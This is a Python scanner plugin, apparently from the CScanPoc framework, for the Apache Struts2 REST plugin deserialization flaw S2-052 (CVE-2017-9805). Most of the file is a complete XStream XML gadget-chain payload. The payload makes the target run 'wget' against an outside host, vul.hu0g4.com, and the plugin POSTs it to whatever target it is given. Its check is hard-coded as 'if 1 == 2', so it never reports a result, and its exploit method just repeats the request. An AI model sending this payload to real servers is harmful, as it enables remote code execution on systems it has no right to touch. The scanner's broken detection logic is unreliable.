# coding: utf-8

import urllib.request
import urllib.error
import urllib.parse
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Apache_Struts_0001'  # 平台漏洞编号，留空
    name = 'Apache Struts2 REST插件远程代码执行(s2-052)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2017-09-06'  # 漏洞公布时间
    desc = '''
        Struts2 是Apache软件基金会负责维护的一个基于MVC设计模式的Web应用框架开源项目。 
        Apache Struts2 REST插件存在远程代码执行漏洞，由于使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，导致攻击者可构造恶意的XML内容执行任意代码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-25267'  # 漏洞来源
    cnvd_id = 'CNVD-2017-25267'  # cnvd漏洞编号
    cve_id = 'CVE-2017-9805'  # cve编号
    product = 'Apache-Struts'  # 漏洞应用名称
    product_version = 'Apache Struts2 >=2.5，<=2.5.12'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '13579086-bfdd-4de6-a5e2-16c627c7400d'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # http://vul.hu0g4.com/1.txt exp请求某个地址，然后查看服务器日志，是否请求 来判断漏洞是否存在
            exploit = '''
<map> 
<entry> 
<jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"> <dataHandler> <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"> <is class="javax.crypto.CipherInputStream"> <cipher class="javax.crypto.NullCipher"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class="javax.imageio.spi.FilterIterator"> <iter class="javax.imageio.spi.FilterIterator"> <iter class="java.util.Collections$EmptyIterator"/> <next class="java.lang.ProcessBuilder"> <command><string>wget</string><string>http://vul.hu0g4.com/1.txt</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class="javax.imageio.ImageIO$ContainsFilter"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class="string">foo</next> </serviceIterator> <lock/> </cipher> <input class="java.lang.ProcessBuilder$NullInputStream"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/> 
</entry> 
</map>
            '''

            headers = {'Content-Type': 'application/xml'}
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            r = requests.post(self.target, headers=headers, data=exploit)
            # 这里需要做搭建好测试地址的请求判断
            if 1 == 2:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()
        self.verify()


if __name__ == '__main__':
    Poc().run()
